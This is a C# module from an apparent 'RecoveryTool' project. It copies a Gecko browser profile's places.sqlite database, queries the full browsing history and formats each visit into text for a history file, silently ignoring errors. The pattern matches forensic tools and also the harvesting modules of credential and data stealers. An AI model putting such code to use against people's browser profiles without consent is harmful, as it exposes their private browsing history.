using Microsoft.Data.Sqlite;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoHistory
    {
        public static async Task RecoverAsync(string browserName, string browserRelativePath)
        {
            await GeckoCommon.RecoverDataAsync(browserName, "History", ProcessProfileAsync, "history.txt");
        }

        private static async Task<string> ProcessProfileAsync(string profilePath)
        {
            var sb = new StringBuilder();
            try
            {
                string placesDbPath = Path.Combine(profilePath, "places.sqlite");
                if (!File.Exists(placesDbPath))
                {
                    return string.Empty;
                }

                string tempDbPath = await GeckoCommon.CopyDatabaseToTempAsync(placesDbPath, "places");
                if (string.IsNullOrEmpty(tempDbPath)) return string.Empty;

                try
                {
                    using var connection = await GeckoCommon.OpenSqliteConnectionAsync(tempDbPath);
                    string query = @"
                        SELECT 
                            moz_places.url,
                            moz_places.title,
                            moz_places.visit_count,
                            moz_places.last_visit_date,
                            moz_historyvisits.visit_date
                        FROM 
                            moz_places
                        JOIN 
                            moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                        ORDER BY 
                            moz_historyvisits.visit_date DESC;";

                    using var command = new SqliteCommand(query, connection);
                    using var reader = await command.ExecuteReaderAsync();
                    while (await reader.ReadAsync())
                    {
                        try
                        {
                            string url = reader["url"] as string ?? string.Empty;
                            string title = reader["title"] as string ?? string.Empty;
                            int visitCount = reader["visit_count"] != DBNull.Value ? Convert.ToInt32(reader["visit_count"]) : 0;
                            long lastVisit = reader["last_visit_date"] != DBNull.Value ? Convert.ToInt64(reader["last_visit_date"]) : 0;
                            long visitDate = reader["visit_date"] != DBNull.Value ? Convert.ToInt64(reader["visit_date"]) : 0;
                            var lastVisitDate = GeckoCommon.UnixTimeStampToDateTime(lastVisit / 1000);
                            var visitDateTime = GeckoCommon.UnixTimeStampToDateTime(visitDate / 1000);
                            sb.AppendLine($"URL: {url}");
                            sb.AppendLine($"Title: {title}");
                            sb.AppendLine($"Visit Count: {visitCount}");
                            sb.AppendLine($"Last Visit Date: {lastVisitDate}");
                            sb.AppendLine($"Visit Date: {visitDateTime}");
                            sb.AppendLine(new string('-', 50));
                        } catch { }
                    }
                }
                catch
                {
                    return string.Empty;
                }
            }
            catch
            {
                return string.Empty;
            }
            return sb.ToString();
        }
    }
}
